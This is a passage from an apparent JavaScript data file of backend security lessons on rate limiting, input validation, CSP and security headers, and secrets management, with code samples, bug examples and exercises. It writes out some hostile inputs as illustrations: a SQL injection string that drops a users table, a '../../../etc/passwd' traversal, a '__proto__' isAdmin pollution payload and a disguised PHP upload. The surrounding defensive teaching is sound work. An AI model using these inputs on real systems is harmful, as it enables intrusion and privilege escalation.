  // Also rate limit by userId for authenticated routes (cannot spoof)
  const key = req.user
    ? "user:" + req.user.id  // authenticated: user ID (unbypassable)
    : "ip:" + clientIp;       // unauthenticated: validated IP

  checkLimit(key, next);
}


// BUG 3: No Retry-After header — clients hammer the server

// WRONG: just return 429 with no guidance
app.use(async (req, res, next) => {
  if (!allowed) return res.status(429).json({ error: "Rate limited" });
  // Client receives 429. What does it do? Immediately retries!
  // Smart clients retry after 1 second. Less smart: after 100ms.
  // 10,000 rate-limited clients all retrying: thundering herd.
});

// RIGHT: explicit Retry-After guidance
app.use(async (req, res, next) => {
  const result = await checkLimit(key);
  if (!result.allowed) {
    res.set("Retry-After",        result.retryAfterSec);      // RFC standard
    res.set("RateLimit-Reset",    Math.floor(Date.now()/1000) + result.retryAfterSec);
    res.set("RateLimit-Remaining", 0);
    return res.status(429).json({
      error: { code: "RATE_LIMITED", message: "Too many requests. Retry in " + result.retryAfterSec + "s" }
    });
  }
  next();
});`,

    challenge: `// CHALLENGE: Build a complete, production-grade rate limiting system
// for a payments API with different tiers and protection layers.

// Business requirements:
// - Free accounts:       100 API calls/min, 1,000 API calls/day
// - Pro accounts:        1,000 API calls/min, 50,000 API calls/day
// - Enterprise:          10,000 API calls/min, unlimited/day
// - SMS verification:    3 per 5 minutes per user, 10 per hour per phone number
// - Login attempts:      5 per minute per IP, 10 per 15 min per email
// - Payment processing:  20 per minute per user (even Enterprise)
// - Report generation:   5 per hour per user (all tiers)
// - Admin endpoints:     100 per minute, no daily limit

// Part 1: TieredRateLimiter class
//   check(userId, tier, endpoint, ip): Promise<RateLimitResult>
//   Applies ALL applicable limits for this context.
//   Returns:
//   { allowed: boolean, limits: LimitCheck[], mostRestrictive: LimitCheck }
//   LimitCheck: { name, limit, remaining, resetAt, retryAfterSec }

// Part 2: Rate limit middleware factory
//   Uses TieredRateLimiter.
//   Sets all RFC-standard headers on every response (even non-limited).
//   Logs rate limit hits with: userId, tier, endpoint, ip, limit hit.
//   For 429: includes which specific limit was hit.

// Part 3: Rate limit dashboard
//   GET /admin/rate-limits/:userId
//   Shows current usage against all limits for a specific user.
//   GET /admin/rate-limits/stats
//   Shows: top 10 rate-limited endpoints, top 10 rate-limited users,
//   total 429s in last hour, current active rate limits.

// Part 4: Adaptive rate limiting
//   If a user hits the rate limit 5+ times in 10 minutes:
//   Temporarily reduce their limit by 50% for 1 hour.
//   Send them a notification email.
//   If they hit limits 3 hours in a row: flag for manual review.

// Use: sliding window for per-minute limits, fixed window for per-day limits.
// Store all state in Redis. Expose current rate limit state via /admin endpoints.`
  },

  {
    id: 8,
    title: "Input Validation & Sanitization",
    tag: "Trust Nothing · Validate Everything",
    color: "#10b981",
    tldr: "Every piece of data that enters your system from outside is potentially malicious. Validation proves data is the right shape. Sanitization removes dangerous content. These are your first and most important line of defense — before data ever touches your database, business logic, or external services.",
    why: `The fundamental rule of security: never trust input. Every piece of data that comes from outside your system — HTTP request body, headers, query params, URL params, file uploads, webhook payloads — is potentially crafted by an attacker.

Validation catches:
  - Wrong data types that crash your code
  - Values out of range that break business logic
  - Missing required fields that cause null pointer errors
  - Strings that are actually SQL injection payloads

Sanitization handles:
  - HTML tags in user content (XSS vectors)
  - Null bytes in filenames (\x00 tricks some systems)
  - Path traversal sequences (../../../etc/passwd)
  - Unicode normalization attacks (ﬁ vs fi — same looking, different bytes)

The business impact: a validation failure that reaches your DB can corrupt data, expose other users' data, or take down your service. Catching it at the boundary is infinitely cheaper.`,

    analogy: `Think of your API as an AIRPORT SECURITY CHECKPOINT.

PASSENGERS (requests) arrive from the outside world.
You cannot know if any of them is malicious.

SECURITY CHECKPOINT (validation layer):
  ID check:        Is this the right type? (string, not an object)
  Boarding pass:   Are they allowed here? (schema validation)
  Luggage scanner: Does the content match the declaration? (business rules)

CONFISCATED ITEMS (sanitization):
  Liquids over 100ml:   HTML script tags in user input
  Prohibited items:     SQL special characters in raw strings
  Suspicious objects:   ../../../ in file paths
  Weapons:              Null bytes, command injection payloads

WHAT HAPPENS IF SECURITY FAILS:
  One unvalidated input can bring down your entire system.
  SQL injection: one string → full DB dump.
  Path traversal: one filename → /etc/passwd.
  Prototype pollution: one object → your entire Node.js process compromised.

VALIDATION STRATEGY — fail fast at the boundary:
  Validate at: HTTP handler entry point.
  Never pass unvalidated data to: services, repositories, external calls.
  Return: 400/422 immediately with clear field-level error messages.
  Never: pass validation errors to the database to discover.`,

    deep: `ZOD vs JOI vs EXPRESS-VALIDATOR:

ZOD (TypeScript-first, modern):
  Type inference — your validated output IS typed.
  const schema = z.object({ email: z.string().email() });
  const result = schema.parse(req.body); // throws on invalid
  result is inferred as { email: string } — TypeScript knows.
  Best for TypeScript projects.

JOI (battle-tested, very expressive):
  const schema = Joi.object({ email: Joi.string().email().required() });
  const { error, value } = schema.validate(req.body);
  Returns error object — does not throw.
  More mature ecosystem, great documentation.

EXPRESS-VALIDATOR (middleware-based):
  body("email").isEmail().normalizeEmail();
  Runs as middleware. Results in req.validationErrors().
  Most idiomatic for Express but less type-safe.

VALIDATION LEVELS:
  Level 1 — TYPE: is this a string? a number? an object?
  Level 2 — FORMAT: is this a valid email? UUID? ISO date?
  Level 3 — RANGE: is the number between 1 and 100? string 2-200 chars?
  Level 4 — BUSINESS RULE: does this email already exist? is the coupon valid?
  
  Levels 1-3: in the schema validator (before hitting any service).
  Level 4: in the service layer (requires DB/cache access).

FILE UPLOAD VALIDATION:
  Never trust the Content-Type header from the client — trivially spoofed.
  Check MIME type from actual file content (magic bytes):
  JPEG: FF D8 FF
  PNG: 89 50 4E 47
  PDF: 25 50 44 46
  Use: file-type npm package (reads magic bytes).
  
  Also check: file size (before reading entire body!), filename (sanitize), dimensions (for images).

PROTOTYPE POLLUTION:
  Attacker sends: { "__proto__": { "isAdmin": true } }
  After Object.assign(target, userInput):
  Object.prototype.isAdmin === true
  Every object in your process now has isAdmin: true.
  
  Defense: use Object.create(null) for parsed data, validate that keys do not include
  "__proto__", "constructor", "prototype".`,

    code: `// ZOD SCHEMA VALIDATION ──────────────────────────────

const { z } = require("zod");

// Define schemas once, reuse across routes and tests
const UserSchemas = {
  register: z.object({
    name:     z.string().min(2, "Name too short").max(100, "Name too long").trim(),
    email:    z.string().email("Invalid email format").toLowerCase(),
    password: z.string()
      .min(12, "Password must be at least 12 characters")
      .regex(/[A-Z]/,    "Password must contain an uppercase letter")
      .regex(/[0-9]/,    "Password must contain a number")
      .regex(/[^a-zA-Z0-9]/, "Password must contain a special character"),
    role:     z.enum(["viewer", "editor"]).default("viewer"), // admin not self-assignable
    phone:    z.string().regex(/^\+?[1-9]\d{7,14}$/, "Invalid phone number").optional()
  }),

  updateProfile: z.object({
    name:    z.string().min(2).max(100).trim().optional(),
    bio:     z.string().max(500).trim().optional(),
    website: z.string().url("Invalid website URL").optional().or(z.literal("")),
    avatarUrl: z.string().url().optional()
  }).refine(
    (data) => Object.keys(data).length > 0,
    { message: "At least one field is required" }
  ),

  listUsers: z.object({
    page:   z.coerce.number().int().positive().default(1),
    limit:  z.coerce.number().int().min(1).max(100).default(20),
    search: z.string().max(100).trim().optional(),
    role:   z.enum(["admin", "editor", "viewer"]).optional(),
    status: z.enum(["active", "suspended"]).optional(),
    sortBy: z.enum(["createdAt", "name", "email"]).default("createdAt"),
    order:  z.enum(["asc", "desc"]).default("desc")
  })
};

const OrderSchemas = {
  create: z.object({
    items: z.array(z.object({
      productId: z.string().uuid("Invalid product ID"),
      quantity:  z.number().int().positive("Quantity must be positive").max(100)
    })).min(1, "Order must have at least one item").max(50, "Too many items"),
    shippingAddressId: z.string().uuid("Invalid address ID"),
    couponCode:        z.string().regex(/^[A-Z0-9]{4,20}$/).optional(),
    paymentMethod:     z.enum(["razorpay", "upi", "cod"]).default("razorpay")
  }),

  updateStatus: z.object({
    status: z.enum(["confirmed", "processing", "shipped", "delivered", "cancelled"]),
    notes:  z.string().max(500).trim().optional(),
    trackingId: z.string().max(100).trim().optional()
  })
};


// VALIDATION MIDDLEWARE FACTORY ───────────────────────

function validate(schema, source = "body") {
  return async (req, res, next) => {
    try {
      // Parse from body, query, or params
      const data = source === "query"  ? req.query
                 : source === "params" ? req.params
                 :                       req.body;

      // .parse() throws ZodError on failure
      // .safeParse() returns { success, data, error } — use when you want to handle error yourself
      const validated = await schema.parseAsync(data);

      // Replace source with validated (coerced, trimmed, defaulted) data
      if (source === "body")   req.body   = validated;
      if (source === "query")  req.query  = validated;
      if (source === "params") req.params = validated;

      next();
    } catch (err) {
      if (err.name === "ZodError") {
        const fieldErrors = err.issues.reduce((acc, issue) => {
          const field = issue.path.join(".");
          acc[field] = issue.message;
          return acc;
        }, {});

        return res.status(422).json({
          success: false,
          error: {
            code:    "VALIDATION_ERROR",
            message: "Request validation failed",
            fields:  fieldErrors
          }
        });
      }
      next(err);
    }
  };
}

// Usage — validation runs BEFORE auth and business logic
app.post("/api/users",
  validate(UserSchemas.register, "body"),
  authenticate,
  authorize("users:create"),
  UserController.register
);

app.get("/api/users",
  authenticate,
  validate(UserSchemas.listUsers, "query"),
  UserController.list
);


// SANITIZATION ─────────────────────────────────────────

class Sanitizer {
  // Remove HTML tags — prevent XSS in stored content
  stripHtml(input) {
    return String(input).replace(/<[^>]*>/g, "").trim();
  }

  // Sanitize user-generated HTML — allow some tags (for rich text editors)
  sanitizeHtml(input) {
    const allowedTags = ["p", "br", "strong", "em", "ul", "ol", "li", "blockquote"];
    const allowedAttrs = {}; // no attributes on any tags
    // In production: use the "sanitize-html" package
    // sanitizeHtml(input, { allowedTags, allowedAttributes: allowedAttrs })
    return input.replace(/<(?!\/?(?:p|br|strong|em|ul|ol|li|blockquote)\b)[^>]*>/gi, "");
  }

  // Prevent path traversal in file operations
  sanitizeFilename(filename) {
    return filename
      .replace(/\.\./g, "")      // no parent directory traversal
      .replace(/[/\\]/g, "")     // no path separators
      .replace(/[\x00-\x1f]/g, "") // no control characters
      .replace(/[<>:"|?*]/g, "")   // no Windows forbidden chars
      .trim()
      .slice(0, 255);            // max filename length
  }

  // Prevent prototype pollution in object merges
  sanitizeObject(obj, depth = 0) {
    if (depth > 10) throw new Error("Object too deeply nested");
    if (typeof obj !== "object" || obj === null) return obj;

    const dangerous = ["__proto__", "constructor", "prototype"];
    const clean = Array.isArray(obj) ? [] : Object.create(null);

    for (const [key, value] of Object.entries(obj)) {
      if (dangerous.includes(key)) continue; // drop prototype pollution keys
      clean[key] = typeof value === "object" ? this.sanitizeObject(value, depth + 1) : value;
    }
    return clean;
  }

  // Normalize unicode — prevent homograph attacks
  normalizeUnicode(str) {
    return str.normalize("NFC"); // canonical composition
    // "ﬁle" (ligature fi) → "file" (two separate chars)
    // Prevents homograph attacks where lookalike chars bypass string comparisons
  }
}

const sanitize = new Sanitizer();


// FILE UPLOAD VALIDATION ───────────────────────────────

const fileType = require("file-type");

async function validateUpload(req, res, next) {
  const file = req.file; // from multer
  if (!file) return res.status(400).json({ error: "No file uploaded" });

  // 1. Check file size BEFORE reading content (multer limits.fileSize handles this)
  if (file.size > 10 * 1024 * 1024) { // 10MB
    return res.status(400).json({ error: "File too large (max 10MB)" });
  }

  // 2. Detect MIME type from ACTUAL file content (not client-supplied Content-Type)
  const detected = await fileType.fromBuffer(file.buffer);
  const allowed  = ["image/jpeg", "image/png", "image/webp", "application/pdf"];

  if (!detected || !allowed.includes(detected.mime)) {
    return res.status(400).json({
      error: "File type not allowed. Accepted: JPEG, PNG, WebP, PDF"
    });
  }

  // 3. Sanitize the filename
  file.safeName = sanitize.sanitizeFilename(file.originalname);
  if (!file.safeName) {
    return res.status(400).json({ error: "Invalid filename" });
  }

  // 4. Additional image checks
  if (detected.mime.startsWith("image/")) {
    const sharp = require("sharp");
    const meta  = await sharp(file.buffer).metadata();
    if (meta.width > 8000 || meta.height > 8000) {
      return res.status(400).json({ error: "Image dimensions too large (max 8000x8000)" });
    }
    // Re-encode the image to strip any embedded metadata, scripts, or EXIF attacks
    file.sanitizedBuffer = await sharp(file.buffer).jpeg({ quality: 90 }).toBuffer();
  }

  next();
}`,

    bugs: `// BUG 1: Validating after using the data

async function createUserBad(req, res) {
  const { email, password } = req.body;
  // Using req.body before any validation

  const hashed = await bcrypt.hash(password, 12); // password could be undefined or an object
  const user   = await pgPool.query(
    "INSERT INTO users(email, password_hash) VALUES($1, $2)",
    [email, hashed] // email could be "''; DROP TABLE users; --"
  );
  // But wait — pg uses parameterized queries, so SQL injection is mitigated here.
  // But: if email is an object, this crashes with "invalid input syntax"
  // If password is undefined: bcrypt throws — unhandled, 500 response

  res.json({ success: true });
}

async function createUserGood(req, res, next) {
  // Validate FIRST, before anything else happens
  const schema = z.object({
    email:    z.string().email(),
    password: z.string().min(12)
  });
  let data;
  try { data = schema.parse(req.body); }
  catch (err) { return res.status(422).json({ error: "Invalid input" }); }

  // NOW use validated data — guaranteed to be correct types and format
  const hashed = await bcrypt.hash(data.password, 12);
  const user   = await pgPool.query("INSERT INTO users(email, password_hash) VALUES($1, $2)", [data.email, hashed]);
  res.json({ success: true });
}


// BUG 2: Prototype pollution via JSON.parse

app.post("/api/settings", (req, res) => {
  const settings = req.body; // Express parsed JSON for us

  // If attacker sends: { "__proto__": { "isAdmin": true } }
  // Then after merge:
  Object.assign(defaultSettings, settings);
  // Object.prototype.isAdmin is now true on EVERY object in the process
  // req.user.isAdmin === true (even though we never set it)
  // Authorization checks using .isAdmin fail open

  res.json({ success: true });
});

// FIX: sanitize before any object operations
app.post("/api/settings", (req, res) => {
  const raw      = req.body;
  const settings = sanitize.sanitizeObject(raw); // strips __proto__, constructor keys
  const allowed  = ["theme", "language", "notifications"]; // explicit allowlist
  const safe     = {};
  for (const key of allowed) {
    if (key in settings) safe[key] = settings[key];
  }
  Object.assign(defaultSettings, safe);
  res.json({ success: true });
});


// BUG 3: Trusting Content-Type for file type detection

app.post("/api/upload", upload.single("file"), async (req, res) => {
  const file = req.file;
  // WRONG: trusting client-sent Content-Type
  if (file.mimetype === "image/jpeg") {
    await processImage(file.buffer);
  }
  // Attacker renames malicious.php to photo.jpg and uploads.
  // Sets Content-Type: image/jpeg.
  // Your code treats it as an image.
  // If your file processing has a vulnerability: RCE.
});

// FIX: detect from actual file content
app.post("/api/upload", upload.single("file"), async (req, res) => {
  const detected = await fileType.fromBuffer(req.file.buffer);
  if (!detected || !["image/jpeg", "image/png"].includes(detected.mime)) {
    return res.status(400).json({ error: "Only JPEG and PNG allowed" });
  }
  // Re-encode to strip any malicious content embedded in the file
  const safe = await sharp(req.file.buffer).jpeg({ quality: 90 }).toBuffer();
  await uploadToStorage(safe, req.file.originalname);
  res.json({ success: true });
});`,

    challenge: `// CHALLENGE: Build a comprehensive input validation layer
// for a SaaS API with 5 different resource types.

// Part 1: Schema library
//   Build schemas for all 5 resources. Each schema must enforce:
//   a) Correct types for every field
//   b) Format validation (email, URL, UUID, phone, date)
//   c) Length/range constraints
//   d) Enums where applicable
//   e) Cross-field validation (e.g., startDate must be before endDate)

//   Resources:
//   Project: { name(3-100), description(max 1000), status(enum), startDate, endDate, budget(0-100M) }
//   Task: { title(2-200), description(max 5000), priority(1-5), assigneeId(UUID), dueDate, tags(max 10) }
//   Webhook: { url(HTTPS only, no private IPs), events(array of enum values), secret(min 20 chars) }
//   ApiKey: { name(3-50, alphanumeric+spaces), permissions(array of allowed scopes), expiresAt(future date) }
//   FileUpload: { filename, mimeType(detected, not trusted), size(max 50MB), checksum(SHA256) }

// Part 2: Sanitization pipeline
//   SanitizationPipeline.process(data, rules)
//   Rules: { stripHtml: true, normalizeUnicode: true, trimStrings: true, maxDepth: 5 }
//   Must handle: prototype pollution, circular references, null bytes

// Part 3: Validate middleware with custom error format
//   { success: false, error: { code: "VALIDATION_ERROR", fields: { fieldName: "error message" } } }
//   Collect ALL field errors at once (not fail-fast) so the frontend can show all at once.

// Part 4: File upload validation service
//   ValidateUpload.check(buffer, metadata)
//   Returns: { valid, detectedType, actualSize, dimensions?, issues[] }
//   Checks: magic bytes, max size, image dimensions, re-encode to strip metadata
//   Supported: JPEG, PNG, WebP, PDF, CSV (no executables, no HTML)`
  },

  {
    id: 9,
    title: "Security Headers & CSP",
    tag: "HTTP Security Posture",
    color: "#06b6d4",
    tldr: "Security headers are your browser-side defense layer. Content Security Policy, HSTS, X-Frame-Options, Referrer-Policy — each header closes a specific attack vector. A properly configured security header set can prevent XSS, clickjacking, information leakage, and protocol downgrade attacks even when your application code has bugs.",
    why: `Security headers are free. They take 30 minutes to configure correctly. They prevent entire categories of attacks.

XSS without CSP: an injected script can do anything — steal cookies, keylog, exfiltrate data.
XSS with CSP: the script is blocked by the browser before it executes. Even if your validation misses the XSS, the browser stops it.

Clickjacking without X-Frame-Options: an attacker puts your login page in an invisible iframe on their site. User clicks a button they think is on a game — actually clicks "Confirm wire transfer."
Clickjacking with X-Frame-Options: DENY: browser refuses to render your page in any iframe. Attack impossible.

This is defense in depth — security at multiple layers so a failure at one layer does not mean complete compromise.`,

    analogy: `SECURITY HEADERS as BUILDING SECURITY SYSTEMS:

HSTS (HTTP Strict Transport Security):
  Like telling the guard: "NEVER let anyone in using the back door.
  ALWAYS redirect to the front door, even if they ask for the back."
  Prevents SSL stripping attacks — attacker cannot downgrade to HTTP.

Content Security Policy:
  Like a list of approved contractors.
  "Only scripts from cdn.example.com and nonce-abc123 are allowed to work here.
  Anyone else trying to run code: immediately escorted out."
  Prevents XSS — even if a script is injected, the browser blocks it.

X-Frame-Options: DENY:
  Like preventing someone from setting up a hidden camera
  pointing at your teller window from inside a fake storefront.
  Prevents clickjacking — your page cannot be embedded in an iframe.

X-Content-Type-Options: nosniff:
  Like requiring clear labels on all packages — no guessing.
  Prevents MIME type sniffing — browser uses declared Content-Type, not guessed type.
  Prevents: server returns a .jpg but it is actually JavaScript. Browser refuses to execute.

Referrer-Policy:
  Like choosing whether to put a return address on an envelope.
  strict-origin-when-cross-origin: only send the domain, not the full URL.
  Prevents leaking: https://app.example.com/users/u_123/edit/ssn to third-party analytics.

Permissions-Policy:
  Like turning off all building facilities that are not needed.
  "This office does not need the microphone. Disable it for all tenants."
  Prevents: malicious script enabling camera, microphone, geolocation.`,

    deep: `CONTENT SECURITY POLICY — the most powerful, most complex:

DIRECTIVE BREAKDOWN:
  default-src:     fallback for all resource types
  script-src:      where JavaScript can load from
  style-src:       where CSS can load from
  img-src:         where images can load from
  connect-src:     where fetch/XHR/WebSocket can connect
  font-src:        where fonts can load from
  frame-src:       where iframes can load from
  object-src:      plugins (always 'none')
  base-uri:        restricts <base href> (use 'self')
  frame-ancestors: who can iframe your page (different from X-Frame-Options)
  report-uri:      where to POST CSP violations
  report-to:       modern replacement for report-uri

NONCE-BASED CSP (most secure for dynamic apps):
  Server generates a random nonce for each request.
  Only scripts with matching nonce attribute are allowed.
  <script nonce="abc123xyz">...</script>
  script-src: 'nonce-abc123xyz'
  Inline scripts without nonce are blocked.
  External scripts without nonce are blocked.
  XSS payloads: blocked (attacker does not know the nonce).

HASH-BASED CSP (for truly static inline scripts):
  script-src: 'sha256-base64hashofscript...'
  Only the exact script with that SHA-256 hash is allowed.
  Good for: inline scripts that never change.

REPORT-ONLY MODE:
  Content-Security-Policy-Report-Only: default-src 'self'
  Browser does NOT enforce — just reports violations to report-uri.
  Use to test CSP before enforcing it in production.
  Monitor for a week. Fix violations. Then switch to enforcing.

PERMISSIONS POLICY (replaces Feature-Policy):
  Permissions-Policy: camera=(), microphone=(), geolocation=()
  = disable completely
  Permissions-Policy: camera=(self), microphone=(self "https://meet.example.com")
  = allow for self and specific partner

CORS vs CSP vs SOP:
  Same-Origin Policy (SOP): browser built-in — scripts from origin A cannot read origin B responses.
  CORS: controlled exception to SOP — server grants specific origins access.
  CSP: controls where resources can be loaded FROM for your page.
  All three are complementary — different attack surfaces.`,

    code: `// COMPREHENSIVE SECURITY HEADERS MIDDLEWARE ──────────

const crypto = require("crypto");

function generateNonce() {
  return crypto.randomBytes(16).toString("base64");
}

function securityHeaders(config = {}) {
  const {
    reportUri = null,
    allowedScriptSources = [],
    allowedStyleSources  = [],
    allowedConnectSources = [],
    allowedImageSources  = ["data:", "https:"],
    frameAncestors = "'none'",
    isDev = process.env.NODE_ENV !== "production"
  } = config;

  return function(req, res, next) {
    // Generate per-request nonce for CSP
    const nonce = generateNonce();
    req.cspNonce = nonce; // available in templates: <script nonce="<%= nonce %>">

    // ─ HSTS ─────────────────────────────────────────────────
    if (!isDev) {
      res.set("Strict-Transport-Security", "max-age=63072000; includeSubDomains; preload");
      // 2 years, all subdomains, browser preload list eligible
    }

    // ─ CONTENT SECURITY POLICY ───────────────────────────────
    const scriptSrc = [
      "'self'",
      "'nonce-" + nonce + "'",  // only scripts with this nonce
      ...allowedScriptSources
    ];
    const styleSrc = [
      "'self'",
      "'nonce-" + nonce + "'",
      "https://fonts.googleapis.com",
      ...allowedStyleSources
    ];
    const connectSrc = [
      "'self'",
      process.env.API_URL,
      "wss://" + process.env.API_HOST,
      ...allowedConnectSources
    ].filter(Boolean);

    const cspDirectives = [
      "default-src 'self'",
      "script-src " + scriptSrc.join(" "),
      "style-src " + styleSrc.join(" "),
      "img-src 'self' " + allowedImageSources.join(" "),
      "font-src 'self' https://fonts.gstatic.com",
      "connect-src " + connectSrc.join(" "),
      "object-src 'none'",
      "base-uri 'self'",
      "frame-ancestors " + frameAncestors,
      "form-action 'self'",
      "upgrade-insecure-requests",
      ...(reportUri ? ["report-uri " + reportUri] : []),
      ...(reportUri ? ["report-to csp-endpoint"] : [])
    ];

    res.set("Content-Security-Policy", cspDirectives.join("; "));

    // ─ REPORTING ─────────────────────────────────────────────
    if (reportUri) {
      res.set("Report-To", JSON.stringify({
        group: "csp-endpoint",
        max_age: 86400,
        endpoints: [{ url: reportUri }]
      }));
    }

    // ─ ANTI-CLICKJACKING ─────────────────────────────────────
    res.set("X-Frame-Options", "DENY");
    // frame-ancestors in CSP is more powerful, but X-Frame-Options covers older browsers

    // ─ MIME SNIFFING ─────────────────────────────────────────
    res.set("X-Content-Type-Options", "nosniff");

    // ─ XSS FILTER (legacy IE support) ────────────────────────
    res.set("X-XSS-Protection", "1; mode=block");

    // ─ REFERRER CONTROL ──────────────────────────────────────
    res.set("Referrer-Policy", "strict-origin-when-cross-origin");
    // Sends: https://example.com (origin only) for cross-origin
    // Sends: full URL for same-origin
    // Prevents leaking user IDs, tokens in URLs to third parties

    // ─ PERMISSIONS POLICY ────────────────────────────────────
    res.set("Permissions-Policy", [
      "camera=()",           // no camera access
      "microphone=()",       // no microphone
      "geolocation=()",      // no GPS
      "payment=(self)",      // payment API for self only
      "usb=()",              // no USB access
      "interest-cohort=()"   // no FLoC
    ].join(", "));

    // ─ CROSS-ORIGIN ISOLATION ─────────────────────────────────
    res.set("Cross-Origin-Embedder-Policy",  "require-corp");
    res.set("Cross-Origin-Opener-Policy",    "same-origin");
    res.set("Cross-Origin-Resource-Policy",  "same-origin");

    // ─ CACHE CONTROL FOR SENSITIVE PAGES ─────────────────────
    if (req.user) {
      // Authenticated pages: never cache in shared (CDN/proxy) caches
      res.set("Cache-Control", "private, no-store");
    }

    next();
  };
}


// CSP VIOLATION ENDPOINT ──────────────────────────────

app.post("/api/csp-report", express.json({ type: "application/csp-report" }), (req, res) => {
  const report = req.body["csp-report"];
  if (!report) return res.status(400).end();

  logger.warn("csp_violation", {
    documentUri:     report["document-uri"],
    violatedDirective: report["violated-directive"],
    blockedUri:      report["blocked-uri"],
    sourceFile:      report["source-file"],
    lineNumber:      report["line-number"]
  });

  // Track violation counts — sudden spike = active XSS attack
  redis.incr("csp:violations:" + new Date().toISOString().slice(0, 13)).catch(() => {});

  res.status(204).end();
});


// TEMPLATE ENGINE INTEGRATION (for SSR) ───────────────

// Express with EJS — passing nonce to template
app.get("/*", (req, res) => {
  res.render("index", {
    nonce: req.cspNonce,
    user:  req.user
  });
});

// EJS template — only scripts with the nonce are executed
/*
  <script nonce="<%= nonce %>" src="/app.js"></script>
  <script nonce="<%= nonce %>">
    window.__INITIAL_STATE__ = <%- JSON.stringify(state) %>;
  </script>

  Note: <%- renders unescaped — use for JSON data (not user input)
         <%= renders escaped — use for all user-generated content
*/


// SECURITY HEADER AUDIT ───────────────────────────────

async function auditSecurityHeaders(url) {
  const res = await fetch(url);
  const headers = {};
  for (const [k, v] of res.headers) headers[k.toLowerCase()] = v;

  const checks = {
    hsts:             !!headers["strict-transport-security"],
    csp:              !!headers["content-security-policy"],
    xFrameOptions:    !!headers["x-frame-options"],
    xContentType:     headers["x-content-type-options"] === "nosniff",
    referrerPolicy:   !!headers["referrer-policy"],
    permissionsPolicy: !!headers["permissions-policy"]
  };

  const missing = Object.entries(checks).filter(([,v]) => !v).map(([k]) => k);
  const score   = Math.round((Object.values(checks).filter(Boolean).length / 6) * 100);

  return { score, checks, missing, grade: score >= 90 ? "A" : score >= 70 ? "B" : score >= 50 ? "C" : "F" };
}`,

    bugs: `// BUG 1: CSP that is too permissive (common "fix" that breaks the protection)

// WRONG: unsafe-inline defeats most of CSP's XSS protection
res.set("Content-Security-Policy",
  "default-src 'self'; script-src 'self' 'unsafe-inline'"
);
// 'unsafe-inline' allows: <script>ANY CODE</script>
// This is exactly the XSS attack CSP is supposed to prevent.
// You have CSP configured but it does nothing against inline XSS.

// WRONG: unsafe-eval + all CDNs
res.set("Content-Security-Policy",
  "default-src *; script-src * 'unsafe-eval' 'unsafe-inline'"
);
// Wildcard: any domain can load scripts. Any eval(). Any inline script.
// This CSP header provides exactly ZERO protection.
// It is actively misleading — developers think they are protected.

// RIGHT: nonce-based CSP with strict defaults
res.set("Content-Security-Policy",
  "default-src 'none'; " +
  "script-src 'self' 'nonce-" + req.cspNonce + "'; " +
  "style-src 'self' 'nonce-" + req.cspNonce + "'; " +
  "img-src 'self' data:; " +
  "connect-src 'self'; " +
  "frame-ancestors 'none'; " +
  "base-uri 'self'; " +
  "object-src 'none'"
);


// BUG 2: Setting security headers only on some routes

// WRONG: only the login page has security headers
app.post("/login", securityHeaders(), AuthController.login);
app.get("/dashboard",                 DashboardController.get);
// Dashboard has no security headers — clickjacking, XSS, MIME sniffing all possible

// RIGHT: apply as global middleware BEFORE all routes
app.use(securityHeaders());
app.use(corsMiddleware);
app.use(express.json());
// Now every response includes security headers


// BUG 3: Missing nonce causes CSP to block your own scripts

// Server sets: Content-Security-Policy: script-src 'self' 'nonce-xyz123'
// Template renders:
// <script src="/app.js"></script>  ← from 'self': ALLOWED
// <script>window.CONFIG = {}</script>  ← inline, no nonce: BLOCKED by CSP
// Result: your own app breaks

// FIX: add nonce to ALL your inline scripts
// Template: <script nonce="<%= nonce %>">window.CONFIG = {}</script>

// Also fix for event handlers:
// WRONG:  <button onclick="doSomething()">Click</button>  ← blocked by CSP
// RIGHT:  button.addEventListener("click", doSomething)  ← no inline handlers`,

    challenge: `// CHALLENGE: Implement and audit a complete security header system.

// Part 1: SecurityHeadersService
//   configure(options) → builds the full middleware stack
//   Options:
//   - allowedScriptSources: string[]   (additional CDN/partner script hosts)
//   - allowedStyleSources:  string[]
//   - allowedConnectSources: string[]  (WebSocket hosts, API domains)
//   - allowedImageSources:  string[]
//   - frameAncestors:       string     (default: 'none')
//   - reportUri:            string     (for CSP violation reporting)
//   - isDevelopment:        boolean    (relaxes HSTS in dev)

// Part 2: Dynamic CSP for a React SPA served by Express
//   Problem: React uses inline styles. Some analytics use eval().
//   Solution: nonce-based CSP without 'unsafe-inline'.
//   - Generate nonce per request
//   - Inject into HTML template: <script nonce="{nonce}">
//   - React renders: __webpack_nonce__ = "{nonce}"  (Webpack uses this for dynamic chunks)
//   - Show the complete middleware + template setup that passes the nonce through.

// Part 3: CSP Violation Monitor
//   POST /api/csp-report (accepts CSP violation reports)
//   - Parse the violation report
//   - Log with severity based on violated directive
//   - Alert if: same directive violated > 50 times in 1 hour (possible XSS attempt)
//   - Dashboard: GET /admin/csp-violations?hours=24
//     Returns: violations grouped by directive, top 10 blocked URIs, hourly trend

// Part 4: Security Header Auditor
//   audit(url): fetches the URL and checks all security headers
//   Grades each header:
//   - HSTS: present? max-age? includeSubDomains? preload?
//   - CSP: present? has unsafe-inline? has unsafe-eval? has wildcards?
//   - X-Frame-Options: present? DENY or SAMEORIGIN?
//   - Referrer-Policy: present? strict enough?
//   Overall score 0-100 and letter grade.
//   Output actionable recommendations for each failing check.`
  },

  {
    id: 10,
    title: "Secrets Management & Environment Security",
    tag: "Config Security · Vault · Key Rotation",
    color: "#a78bfa",
    tldr: "Secrets in environment variables are better than hardcoded secrets, but still have significant risks. Production-grade secrets management means: vault storage, least-privilege access, automatic rotation, audit logging, and zero secrets in your codebase or logs. This is what separates a secure system from a breach waiting to happen.",
    why: `The GitHub secret scanner finds millions of accidentally committed secrets every year: API keys, database passwords, JWT secrets, AWS credentials. Every one is a potential breach. Some companies have been breached through a single exposed .env file in a GitHub commit.

Beyond accidental exposure, secrets have a lifecycle:
  - They get compromised — someone leaves the company, a laptop is stolen, a phishing attack succeeds.
  - They need to be rotated — regularly as a security practice, immediately after suspected compromise.
  - They need to be audited — who accessed what secret, when?

Environment variables solve the "don't hardcode" problem. They do not solve: rotation, audit logging, least-privilege access, secrets in process memory that can be read from proc filesystem.

Production secrets management is how you make compromises survivable.`,

    analogy: `SECRETS MANAGEMENT as KEY MANAGEMENT for a BANK:

ENVIRONMENT VARIABLES (basic protection):
  Like keeping the vault key in a locked desk drawer.
  Better than leaving it on the counter.
  But: anyone with desk access has the key.
  The key never changes. If stolen: permanent compromise.

SECRETS VAULT (production approach):
  Like a professional key management service with:
  - The key never leaves the vault system.
  - Each bank employee has their own key card (identity).
  - Key cards have access to only the vaults they need.
  - Every key card use is logged: who, when, which vault.
